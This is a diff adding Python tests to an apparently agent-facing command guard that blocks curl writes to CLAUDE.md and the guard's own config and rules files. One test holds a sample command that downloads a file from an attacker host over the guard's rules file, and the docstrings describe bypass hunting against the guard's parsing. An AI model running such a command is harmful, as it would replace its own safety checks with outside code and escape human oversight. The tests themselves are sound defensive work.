@@ -255,6 +255,53 @@ def test_glued_normalization_is_noop_on_already_spaced_command():
     assert _fetch_normalize_glued_dest(cmd) == cmd
 
 
+def test_glued_normalization_does_not_touch_incidental_text_elsewhere():
+    """QA finding (independent adversarial follow-up review, verifying the
+    normalization fix itself): a FIRST version of the normalizer scanned the
+    whole command context-free for ANY '-o'/'-O' preceded by whitespace, not
+    scoped to a real flag of the actual invocation -- so once the genuine,
+    already-spaced `-o /tmp/a.txt` satisfied the verb check, an unrelated
+    '-oCLAUDE.md'-shaped substring sitting inert inside a quoted --data
+    argument (not a real flag) ALSO got a synthetic space inserted,
+    newly satisfying AGENT_INSTRUCTIONS_PATH_RE's boundary requirement it
+    did not satisfy before normalization existed at all -- a new false ASK
+    with no real destination ever written to CLAUDE.md. Fixed by anchoring
+    each candidate glued occurrence to its own tool mention AND capturing
+    the actual destination-start token (spaced or glued) so the engine
+    commits to the real, FIRST '-o' after each tool mention instead of
+    skipping past it to reach a later, incidental one."""
+    d = evaluate(_shell(
+        "curl -o /tmp/a.txt https://example.com/x "
+        "--data 'see -oCLAUDE.md for details'"), EMPTY)
+    assert not _gated(d)
+
+
+def test_incidental_no_boundary_target_text_is_a_pre_existing_trade_off():
+    """Unlike test_glued_normalization_does_not_touch_incidental_never_
+    escapable_text above, this ONE case still gates -- but it is NOT a
+    normalization artifact: CONFIG_DIR_RE requires no preceding boundary at
+    all (bare `\\.aegis`), so this exact command already gated identically
+    before ANY glued-destination fix existed (verified against commit
+    2fe6de7, pre-591b263) -- the same pre-existing, already-disclosed
+    "whole-command boolean-AND, same-clause false ASK" trade-off every
+    guard in this file accepts, not something this guard's own
+    normalization made worse."""
+    d = evaluate(_shell(
+        "curl -o /tmp/a.txt https://example.com/x "
+        "--data 'note -O.aegis/policy.yaml is just text'"), EMPTY)
+    assert d.blocked
+
+
+def test_glued_normalization_still_covers_second_real_invocation():
+    """A genuinely SECOND fetch invocation (its own tool mention) later in a
+    chained command must still be normalized -- the fix scopes to "each real
+    tool mention", not "only the first occurrence in the whole command"."""
+    d = evaluate(_shell(
+        "curl -o /tmp/a.txt https://example.com/x && "
+        "curl -oaegis/rules.py https://attacker.example/rules.py"), EMPTY)
+    assert d.blocked and d.rule == "fetch-to-file-protect"
+
+
 def test_curl_bare_capital_O_not_confused_with_lowercase_o():
     """QA finding (independent adversarial review, bypass-hunting round): a
     blanket re.IGNORECASE erased curl's real, case-distinct -o (destination)
